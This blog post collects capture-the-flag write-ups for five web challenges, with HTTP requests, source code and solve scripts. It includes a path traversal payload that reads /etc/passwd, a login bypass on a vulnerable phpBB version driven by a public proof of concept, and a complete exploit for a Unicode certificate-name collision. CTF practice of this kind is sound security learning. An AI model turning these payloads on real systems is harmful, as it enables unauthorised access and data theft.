---
layout: post
title:  "Web Challenges"
date:   2026-09-07 15:14:00 -0400
author: uzi
tags: [CTF]
permalink: /nns-ctf-2026-web/
---
* TOC
{:toc}

## Web Hacker 2

**Author**: piprett

**Category**: Web beginner

**Description**: Never hacked a website before? Start here.

I go to the challenge site:

![Alt text](/images/nnsweb1.png)

When the page loads you make one GET request to `/boarding-pass` and one GET request to `/api/boarding-pass/john`.

I made a request to `/api/boarding-pass/admin`:
```http
GET /api/boarding-pass/admin HTTP/2
Host: web-hacker2-bab3a181f6c0.chall.nnsc.tf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://web-hacker2-bab3a181f6c0.chall.nnsc.tf/boarding-pass
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

Response:
```shell
HTTP/2 200 OK
Content-Type: application/json;charset=utf-8
Date: Fri, 04 Sep 2026 18:05:37 GMT
Content-Length: 2111

{"id":"01a06d96-9616-7000-a2cb-44f4adf3a608","username":"admin","qrCode":"data:image/png;base64,...theb64imagedata...","route":1337,"fromName":"Stavanger","fromCode":"ENZV","toName":"NNS{y0U_4Re_now_1337_h4cker_iNd33d}","toCode":"FLAG","gate":"B2","boarding":"12:00","departure":"12:20","passenger":"FLAG/ADMIN","group":"0","seat":"1A"}
```

`NNS{y0U_4Re_now_1337_h4cker_iNd33d}`

___

## NNS Travel

**Author**: piprett

**Category**: Web beginner

**Description**: NNS Air has launched a brand new travel agency: NNS Air Travel Agency. Now you just need to find the tickets they ordered for you. The flag is located at `/flag.txt`.

I got some source code for this challenge. There is no filtering or sanitization done on user controlled input:
```ts
import travel from './travel.html';

const srv = Bun.serve({
  routes: {
    '/': travel,
    '/meta': () => {
      return Response.json({
        team: 'ACME Inc.',
      });
    },
    '/get-file': {
      POST: async (req) => {
        const url = new URL(req.url);
        const ticket = url.searchParams.get('pnr');

        const f = Bun.file('./tickets/' + ticket);
        try {
          return new Response(await f.text(), {
            headers: {
              'Content-Type': 'application/json',
            },
          });
        } catch (e) {
          return Response.json(
            {
              ok: false,
              error: 'Ticket not found.',
            },
            { status: 404 },
          );
        }
      },
    },
  },
  port: 3000,
});

console.log(`Listening on ${srv.url}`);

function shutdown() {
  console.log('Shutting down gracefully...');
  srv.stop();
  process.exit(0);
}

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
```

I started the challenge instance and tested `../../../../etc/passwd`:
```http
POST /get-file?pnr=../../../../etc/passwd HTTP/2
Host: nns-travel-c3c71c8053f5.chall.nnsc.tf
User-Agent: Bot
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://nns-travel-c3c71c8053f5.chall.nnsc.tf/
Origin: https://nns-travel-c3c71c8053f5.chall.nnsc.tf
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Content-Length: 0
Te: trailers
Connection: keep-alive
```

Response:
```shell
HTTP/2 200 OK
Content-Type: application/json
Date: Fri, 04 Sep 2026 18:15:34 GMT
Content-Length: 149

root:x:0:0:root:/root:/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
```

It works! Get the flag:
```shell
curl -X POST "https://nns-travel-c3c71c8053f5.chall.nnsc.tf/get-file?pnr=../../../../flag.txt"  
NNS{Wh0oP5_Y0U_F0UNd_a_P47h_tR4VeR5a1_in_my_coDe}
```

`NNS{Wh0oP5_Y0U_F0UNd_a_P47h_tR4VeR5a1_in_my_coDe}`

___

## Simon

**Author**: piprett

**Category**: Web beginner

**Description**: You are Simon. Simon must select the optimal seat for his upcoming flight!

I go to the challenge site:

![Alt text](/images/nnsweb2.png)

I need to select one of the gold seats. The button was disabled: `<button id="save" disabled="">Save</button>`

I simply enabled it by editing the html. Then I saved the seat. That gave me the flag:

![Alt text](/images/nnsweb3.png)

`NNS{we_W1sH_Y0u_a_pleasant_fl16ht_with_Nn5_4ir}`

___

## PHP is my passion

**Author**: 0xle

**Category**: Web beginner

**Description**: I run a phpBB forum, but it's a bit outdated. Maybe there's a well-known vulnerability that can be exploited?

I get the challenge files:
```shell
ls  
compose.yml  Dockerfile  entrypoint.sh  install-config.yml  seed.php
```

Contents of `seed.php`:
```php
<?php
$flag = trim(file_get_contents('/flag.txt'));
$now = time();

$db = new SQLite3('/var/www/data/phpbb.db');
$db->exec('DELETE FROM phpbb_privmsgs');
$db->exec('DELETE FROM phpbb_privmsgs_to');

$stmt = $db->prepare('INSERT INTO phpbb_privmsgs (author_id, message_time, message_subject, message_text, to_address) VALUES (2, :t, :s, :m, :a)');
$stmt->bindValue(':t', $now, SQLITE3_INTEGER);
$stmt->bindValue(':s', 'note to self');
$stmt->bindValue(':m', $flag);
$stmt->bindValue(':a', 'u_2');
$stmt->execute();

$msg_id = $db->lastInsertRowID();
$db->exec("INSERT INTO phpbb_privmsgs_to (msg_id, user_id, author_id, folder_id) VALUES ($msg_id, 2, 2, 0)");
$db->exec("UPDATE phpbb_users SET user_new_privmsg = 1, user_unread_privmsg = 1, user_last_privmsg = $now WHERE user_id = 2");
$db->close();
```

Contents of the `Dockerfile`:
```shell
FROM php:8.2.29-apache

RUN set -eux; \
    apt-get update; \
    apt-get install -y --no-install-recommends unzip; \
    rm -rf /var/lib/apt/lists/*; \
    curl -fsSL -o /tmp/phpbb.zip https://download.phpbb.com/pub/release/3.3/3.3.16/phpBB-3.3.16.zip; \
    echo "f3abb3f28ec50b71702edab936e6e1f288d3f1697e131f4427143b72b68f1eee  /tmp/phpbb.zip" | sha256sum -c -; \
    unzip -q /tmp/phpbb.zip -d /tmp; \
    rm -rf /var/www/html /tmp/phpbb.zip; \
    mv /tmp/phpBB3 /var/www/html; \
    sed -i 's/^Listen 80$/Listen 8080/' /etc/apache2/ports.conf; \
    sed -i 's/:80>/:8080>/' /etc/apache2/sites-available/000-default.conf

COPY install-config.yml /tmp/install-config.yml
COPY seed.php /seed.php
COPY entrypoint.sh /entrypoint.sh

RUN set -eux; \
    mkdir -p /var/www/data; \
    sed -i "s|__ADMIN_PASSWORD__|$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 24)|" /tmp/install-config.yml; \
    php /var/www/html/install/phpbbcli.php install /tmp/install-config.yml; \
    rm -rf /var/www/html/install /tmp/install-config.yml; \
    chmod +x /entrypoint.sh; \
    chown -R www-data:www-data /var/www/html /var/www/data

EXPOSE 8080

ENTRYPOINT ["/entrypoint.sh"]
```

I see they are running `phpBB` version `3.3.16`. I found `CVE-2026-48611` and a POC at [https://github.com/Ethicalgrey/phpBB-CVE-2026-48611](https://github.com/Ethicalgrey/phpBB-CVE-2026-48611). The author [Ethicalgrey](https://github.com/Ethicalgrey) explains the vulnerability like this:
```shell
phpBB supports logging in through an external identity provider (OAuth) instead of a local 
password — Apaches own auth mechanism is one of the supported providers. The endpoint that handles 
this, `ucp.php?mode=login_link&auth_provider=apache`, takes the username straight out of 
the HTTP `Authorization: Basic` header and starts an authenticated session for that user.

The bug: it never actually checks the password half of that header. A normal login rejects 
you if the password is wrong. This one doesnt — it trusts whatever username you claim and logs 
you in as them regardless of what password value you send. Any registered username plus a 
made-up password is enough to get a fully authenticated session.

- Affected: phpBB 3.3.0 – 3.3.16
- Fixed in: 3.3.17 (released 2026-06-06)
- Impact: full account takeover of any known username, no password required
```

The exploit script looked like it was working but the login link did not work. The exploit script used a headless browser so I think it didnt work because the headless browser had already made several requests to the target (checking for version, etc). Each of those requests gets an anonymous session cookie. phpBB checks for a session cookie first and only falls back to the `sid=` URL parameter if no cookie exists. When I gave it the admin link the browsers stale anonymous cookie took priority and it would just take me back to the login page.

I had to use `requests.Session()` in python because it keeps it own cookie jar which is separate from my browser. 

I had to run the exploit script and make it visit `/ucp.php?i=pm&mode=view&f=0&p=1` to able to get the flag:
```python
import importlib.util, re

spec = importlib.util.spec_from_file_location("poc", "CVE-2026-48611.py")
poc = importlib.util.module_from_spec(spec)
spec.loader.exec_module(poc)

target = "https://php-is-my-passion-6dce030718c4.chall.nnsc.tf"
session, resp = poc.exploit(target, "admin", timeout=10)
assert poc.confirm_session(target, session, "admin", timeout=10), "auth bypass failed"

inbox = session.get(f"{target}/ucp.php?i=pm&mode=view&folder_id=0")
links = re.findall(r'href="([^"]*i=pm[^"]*mode=view[^"]*p=\d+[^"]*)"', inbox.text)
print(links)

for link in links:
    msg = session.get(f"{target}/{link.replace('&amp;', '&')}")
    print(msg.text)
```

Finally it output the page successfully! I rendered the page on a seperate site:

![Alt text](/images/nssweb4.png)

`NNS{php_is_My_P45s10N_4Nd_50_are_aP4ch3_aUth_ProViD3rs}`

___

## ASS

**Author**: 0xle

**Category**: Web

**Description**: Everything should be self-serve in 2026

I get the challenge files:
```shell
ls  
app.py  ca.py  compose.yml  Dockerfile  names.py  pyproject.toml  templates  uv.lock
```

Contents of `app.py`:
```python
import base64
import binascii
import os
import secrets
import threading
import time
from pathlib import Path
from typing import Literal

from cryptography import x509
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.asymmetric import ed25519
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse
from pydantic import BaseModel

import ca
import names

FLAG = os.environ["FLAG"]

NONCE_LIFETIME = 120.0
MAX_NONCES = 512
MAX_CERTIFICATE_PEM = 8192

INDEX = (Path(__file__).parent / "templates" / "index.html").read_text(encoding="utf-8")

app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)

authority = ca.CertificateAuthority()

lock = threading.Lock()
issued_names: set[str] = set()
administrator: x509.Certificate | None = None
nonces: dict[str, float] = {}


class CertificateRequest(BaseModel):
    profile: Literal["ADMIN", "CLIENT"]
    name: str


class CertificateResponse(BaseModel):
    profile: str
    name: str
    certificate: str
    private_key: str | None = None


class NonceResponse(BaseModel):
    nonce: str
    expires_in: int


class AdminRequest(BaseModel):
    certificate: str
    nonce: str
    signature: str


class AdminResponse(BaseModel):
    flag: str


@app.get("/", response_class=HTMLResponse)
def index() -> str:
    return INDEX


@app.get("/ca.pem", response_class=PlainTextResponse)
def ca_certificate() -> str:
    return ca.certificate_pem(authority.certificate)


@app.post(
    "/certificates",
    response_model=CertificateResponse,
    response_model_exclude_none=True,
)
def provision(request: CertificateRequest) -> CertificateResponse:
    global administrator

    if not names.is_acceptable(request.name):
        raise HTTPException(status_code=400, detail="invalid name")

    with lock:
        if request.name in issued_names:
            raise HTTPException(status_code=409, detail="name already in use")
        if request.profile == "ADMIN" and administrator is not None:
            raise HTTPException(
                status_code=409,
                detail="an administrator certificate has already been provisioned",
            )

        certificate, key = authority.issue(request.name)
        try:
            _ = ca.subject(certificate).hashable
        except ValueError:
            raise HTTPException(status_code=400, detail="invalid name") from None

        issued_names.add(request.name)
        if request.profile == "ADMIN":
            administrator = certificate

    return CertificateResponse(
        profile=request.profile,
        name=request.name,
        certificate=ca.certificate_pem(certificate),
        private_key=None if request.profile == "ADMIN" else ca.private_key_pem(key),
    )


@app.get("/auth/nonce", response_model=NonceResponse)
def issue_nonce() -> NonceResponse:
    nonce = secrets.token_hex(32)
    now = time.monotonic()
    with lock:
        for expired in [n for n, born in nonces.items() if now - born > NONCE_LIFETIME]:
            del nonces[expired]
        if len(nonces) >= MAX_NONCES:
            raise HTTPException(status_code=429, detail="too many outstanding nonces")
        nonces[nonce] = now
    return NonceResponse(nonce=nonce, expires_in=int(NONCE_LIFETIME))


def consume_nonce(nonce: str) -> bool:
    with lock:
        born = nonces.pop(nonce, None)
    return born is not None and time.monotonic() - born <= NONCE_LIFETIME


@app.post("/admin", response_model=AdminResponse)
def administration(request: AdminRequest) -> AdminResponse:
    with lock:
        administrator_certificate = administrator
    if administrator_certificate is None:
        raise HTTPException(
            status_code=409, detail="no administrator certificate has been provisioned"
        )

    if len(request.certificate) > MAX_CERTIFICATE_PEM:
        raise HTTPException(status_code=400, detail="certificate too large")
    try:
        presented = x509.load_pem_x509_certificate(request.certificate.encode())
    except ValueError:
        raise HTTPException(status_code=400, detail="malformed certificate") from None
    try:
        signature = base64.b64decode(request.signature, validate=True)
    except (binascii.Error, ValueError):
        raise HTTPException(status_code=400, detail="malformed signature") from None

    if not consume_nonce(request.nonce):
        raise HTTPException(status_code=401, detail="unknown or expired nonce")
    if not authority.issued_by_us(presented):
        raise HTTPException(
            status_code=401, detail="certificate was not issued by this authority"
        )
    if not ca.is_in_validity_period(presented):
        raise HTTPException(
            status_code=401, detail="certificate is not valid at this time"
        )

    public_key = presented.public_key()
    if not isinstance(public_key, ed25519.Ed25519PublicKey):
        raise HTTPException(status_code=401, detail="unsupported certificate key type")
    try:
        public_key.verify(signature, request.nonce.encode())
    except InvalidSignature:
        raise HTTPException(
            status_code=401, detail="signature does not verify"
        ) from None

    try:
        authorized = ca.subject(presented) == ca.subject(administrator_certificate)
    except ValueError:
        raise HTTPException(status_code=400, detail="malformed certificate") from None
    if not authorized:
        raise HTTPException(status_code=403, detail="not the administrator")

    return AdminResponse(flag=FLAG)
```

`ca.py`:
```python
import datetime

import asn1crypto.x509
from cryptography import x509
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

CA_COMMON_NAME = "ASS Issuing CA"
CA_VALIDITY = datetime.timedelta(days=365)
LEAF_VALIDITY = datetime.timedelta(days=30)
BACKDATE = datetime.timedelta(minutes=5)


def _common_name(name: str) -> x509.Name:
    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, name)])


def certificate_pem(certificate: x509.Certificate) -> str:
    return certificate.public_bytes(serialization.Encoding.PEM).decode()


def private_key_pem(key: ed25519.Ed25519PrivateKey) -> str:
    return key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()


def subject(certificate: x509.Certificate) -> asn1crypto.x509.Name:
    return asn1crypto.x509.Certificate.load(
        certificate.public_bytes(serialization.Encoding.DER)
    ).subject


def is_in_validity_period(certificate: x509.Certificate) -> bool:
    now = datetime.datetime.now(datetime.UTC)
    return certificate.not_valid_before_utc <= now <= certificate.not_valid_after_utc


class CertificateAuthority:
    def __init__(self) -> None:
        self.key = ed25519.Ed25519PrivateKey.generate()
        name = _common_name(CA_COMMON_NAME)
        now = datetime.datetime.now(datetime.UTC)
        self.certificate = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(self.key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - BACKDATE)
            .not_valid_after(now + CA_VALIDITY)
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
            .add_extension(
                x509.KeyUsage(
                    digital_signature=True,
                    content_commitment=False,
                    key_encipherment=False,
                    data_encipherment=False,
                    key_agreement=False,
                    key_cert_sign=True,
                    crl_sign=True,
                    encipher_only=False,
                    decipher_only=False,
                ),
                critical=True,
            )
            .sign(self.key, None)
        )

    def issue(self, name: str) -> tuple[x509.Certificate, ed25519.Ed25519PrivateKey]:
        key = ed25519.Ed25519PrivateKey.generate()
        now = datetime.datetime.now(datetime.UTC)
        certificate = (
            x509.CertificateBuilder()
            .subject_name(_common_name(name))
            .issuer_name(self.certificate.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - BACKDATE)
            .not_valid_after(now + LEAF_VALIDITY)
            .add_extension(
                x509.BasicConstraints(ca=False, path_length=None), critical=True
            )
            .add_extension(
                x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]), critical=False
            )
            .sign(self.key, None)
        )
        return certificate, key

    def issued_by_us(self, certificate: x509.Certificate) -> bool:
        try:
            certificate.verify_directly_issued_by(self.certificate)
        except (ValueError, TypeError, InvalidSignature):
            return False
        return True
```

`names.py`:
```python
MIN_LENGTH = 4
MAX_LENGTH = 16

LATIN_EXTENDED_ADDITIONAL = range(0x1E00, 0x1F00)


def in_repertoire(character: str) -> bool:
    return "A" <= character <= "Z" or ord(character) in LATIN_EXTENDED_ADDITIONAL


def is_acceptable(name: str) -> bool:
    return (
        MIN_LENGTH <= len(name) <= MAX_LENGTH
        and all(in_repertoire(character) for character in name)
        and name.isalpha()
        and name.isupper()
    )
```

`/admin` decides whether a certificate belongs to the administrator with:
```python
authorized = ca.subject(presented) == ca.subject(administrator_certificate)
```

`ca.subject()` returns an `asn1crypto.x509.Name`, and asn1cryptos `Name.__eq__` implements RFC 5280 name comparison which runs each `CommonName` through RFC 4518 string prep: Unicode case folding, then NFKC normalization.

`names.py` allows uppercase letters from `A-Z` or from `U+1E00-U+1EFF` (Latin Extended Additional block). That block contains `U+1E9E` aka `ẞ` (LATIN CAPITAL LETTER SHARP S). Its Unicode case fold mapping is the two characters `"ss"` (took foreverr to find this).

 `"AẞADMIN"` (7 characters and valid per `is_acceptable`) and `"ASSADMIN"` (8 chars also valid) are different raw python strings, meaning they will pass the `issued_names` uniqueness check.

After case fold + NFKC, both collapse to the same string, so `ca.subject(cert1) == ca.subject(cert2)` is True!

Exploit script:
```python
#!/usr/bin/env python3
import base64
import sys

import requests
from cryptography.hazmat.primitives import serialization

ADMIN_NAME = "A\u1e9eADMIN"
CLIENT_NAME = "ASSADMIN"

def main() -> None:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    base = base.rstrip("/")
    s = requests.Session()

    # register administrator certificate (no private key returned)
    r = s.post(f"{base}/certificates", json={"profile": "ADMIN", "name": ADMIN_NAME})
    r.raise_for_status()
    print("Registered admin cert:", r.json())

    # register client certificate with the colliding name (private key returned)
    r = s.post(f"{base}/certificates", json={"profile": "CLIENT", "name": CLIENT_NAME})
    r.raise_for_status()
    data = r.json()
    print("Registered client cert:", data["name"])
    client_cert_pem = data["certificate"]
    client_key_pem = data["private_key"]

    private_key = serialization.load_pem_private_key(
        client_key_pem.encode(), password=None
    )

    # get a nonce and sign it with the client private key
    r = s.get(f"{base}/auth/nonce")
    r.raise_for_status()
    nonce = r.json()["nonce"]
    print("Nonce:", nonce)

    signature = private_key.sign(nonce.encode())
    signature_b64 = base64.b64encode(signature).decode()

    # present the client cert and signature to /admin. Its subject collides with the administrators subject after RFC 4518 normalization!
    r = s.post(
        f"{base}/admin",
        json={
            "certificate": client_cert_pem,
            "nonce": nonce,
            "signature": signature_b64,
        },
    )
    print("/admin response:", r.status_code, r.text)

if __name__ == "__main__":
    main()
```

Output:
```shell
python3 solve.py https://ass-03a31554f342.chall.nnsc.tf  
Registered admin cert: {'profile': 'ADMIN', 'name': 'AẞADMIN', 'certificate': '-----BEGIN CERTIFICATE-----\nMIIBEzCBxqADAgECAhQGv3yOmq2ftTR06H+aO9QF0qwn+jAFBgMrZXAwGTEXMBUG\nA1UEAwwOQVNTIElzc3VpbmcgQ0EwHhcNMjYwOTA0MjA0OTE5WhcNMjYxMDA0MjA1\nNDE5WjAUMRIwEAYDVQQDDAlB4bqeQURNSU4wKjAFBgMrZXADIQAD4lg+al9WCdrt\nJzVwwHNTg3zKkLpgz97BCbgfRDIksaMlMCMwDAYDVR0TAQH/BAIwADATBgNVHSUE\nDDAKBggrBgEFBQcDAjAFBgMrZXADQQATqiiRs3IziRCq8vBlU76JP3ixkRwMV3LJ\n+7km6VZC3Z1e2FeY/tl32TqkhQKXnc07Ylx3l18VRyXMc0COsg0D\n-----END CERTIFICATE-----\n'}  
Registered client cert: ASSADMIN  
Nonce: 3f7383f8a0036c139a9b294673516065ca16df0190fbda506d2f56c46db9462b  
/admin response: 200 {"flag":"NNS{Rfc_3454_fRoZ3_7He_7ab13_bu7_7He_Un1c0D3_K3P7_wa1kin6_craZY_r16H7}"}
```

- Register `ADMIN` with the name `AẞADMIN`. No private key comes back for ADMIN certs.
- Register `CLIENT` with the same name spelled using a literal `SS` instead (`ASSADMIN`). This returns a private key and passes uniqueness since its a different string.
- Sign the `/auth/nonce` challenge with that private key.
- Submit that cert + signature to `/admin`. Its subject collides with the administrators subject under RFC 4518 comparison and the flag is returned.

`NNS{Rfc_3454_fRoZ3_7He_7ab13_bu7_7He_Un1c0D3_K3P7_wa1kin6_craZY_r16H7}`
